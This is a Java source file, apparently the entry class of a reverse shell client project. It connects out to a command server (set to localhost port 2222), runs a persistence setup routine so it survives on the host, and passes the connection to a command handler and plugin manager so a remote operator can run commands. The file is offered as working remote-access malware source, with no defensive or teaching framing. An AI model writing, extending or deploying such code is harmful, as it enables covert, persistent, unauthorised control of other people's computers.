package obs1d1anc1ph3r.reverseshell.client;

import obs1d1anc1ph3r.reverseshell.client.connection.ServerConnection;
import obs1d1anc1ph3r.reverseshell.client.commandhandling.CommandHandler;
import obs1d1anc1ph3r.reverseshell.client.utils.Persistence;
import obs1d1anc1ph3r.reverseshell.client.plugins.PluginManager;

import java.io.IOException;
import java.util.logging.*;

public class ReverseShellClient {

	private static final Logger logger = Logger.getLogger(ReverseShellClient.class.getName());
	private final ServerConnection serverConnection;
	private CommandHandler commandHandler;
	private PluginManager pluginManager;

	//Start the stuff, do the dependancy management and stuff, honestly an okay class, not doing more than it should
	public ReverseShellClient(String serverIp, int serverPort) {
		this.serverConnection = new ServerConnection(serverIp, serverPort);
	}

	public void start() throws Exception {
		try {
			serverConnection.connect();
			Persistence.setup();

			pluginManager = new PluginManager(serverConnection.getStreamHandler());
			commandHandler = new CommandHandler(serverConnection.getStreamHandler(), pluginManager);  // Initialize after connection
			commandHandler.handleCommands();
		} catch (IOException e) {
			logger.log(Level.SEVERE, "Connection error: " + e.getMessage(), e);
		} finally {
			serverConnection.cleanup();
		}
	}

	public static void main(String[] args) throws Exception {
		ReverseShellClient client = new ReverseShellClient("localhost", 2222);
		client.start();
	}
}
